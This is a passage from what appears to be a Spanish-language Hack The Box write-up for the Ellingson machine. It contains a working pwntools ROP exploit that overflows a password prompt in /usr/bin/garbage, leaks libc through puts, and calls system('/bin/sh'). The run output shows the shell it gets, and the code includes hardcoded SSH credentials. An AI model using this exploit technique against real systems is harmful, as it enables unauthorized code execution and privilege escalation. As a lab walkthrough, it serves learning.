    # PUTS() -> rdi -> __libc_main_start -> PUTS(__libc_main_start)
    
    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

    libc = elf.symbols["__libc_start_main"]
    main = elf.symbols["main"]
    puts = elf.plt["puts"]

    log.info("pop rdi: %s" % hex(pop_rdi))
    log.info("libc: %s" % hex(libc))
    log.info("main: %s" % hex(main))
    log.info("puts: %s" % hex(puts))

    payload = junk + p64(pop_rdi) + p64(libc) + p64(puts) + p64(main)

    p.recvuntil(b"Enter access password:")
    p.sendline(payload)

    p.recvline()
    p.recvline()
    leaked_libc = p.recvline()
    leaked_libc = u64(leaked_libc.strip().ljust(8, b"\x00"))

    log.info("leaked_libc: %s" % hex(leaked_libc))

    return leaked_libc

def shell(p, elf, libc, rop):
    
    # system("/bin/sh)")

    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
    ret = (rop.find_gadget(['ret']))[0]

    binsh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]

    payload = b"A"*offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

    p.recvuntil(b"Enter access password:")
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':

    r = ssh(host=ip, user='margo', password='iamgod$08')
    p = r.process("/usr/bin/garbage")

    elf = ELF("./garbage")
    libc = ELF("./libc.so.6")
    rop = ROP(elf)

    leaked_libc = leaked_libc(p, elf, libc, rop)

    libc.address = leaked_libc - libc.sym["__libc_start_main"]

    log.info("[!] Dirección real %s" % hex(libc.address))

    shell(p, elf, libc, rop)
```

```null
python3 exploit.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process bytearray(b'/usr/bin/garbage') on 10.10.10.139: pid 5203
[*] '/home/rubbx/Desktop/HTB/Machines/Ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/rubbx/Desktop/HTB/Machines/Ellingson/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './garbage'
[*] pop rdi: 0x40179b
[*] libc: 0x403ff0
[*] main: 0x401619
[*] puts: 0x401050
[*] leaked_libc: 0x7efef498dab0
[*] [!] Dirección real 0x7efef496c000
[*] Switching to interactive mode
 
access denied.
$ $ whoami
margo
```

Para poder ganar acceso como root, tengo que setear mi UID y GUID como este usuario. Esto se puede hacer con otro gadget y cargando el 0 en el ```rdi```. Como la función ```shell()``` ya se ha ejecutado, para poder que se vuelva a efectuar pero como root, vuelvo a llamar a la función ```main``` y que interprete todo de nuevo





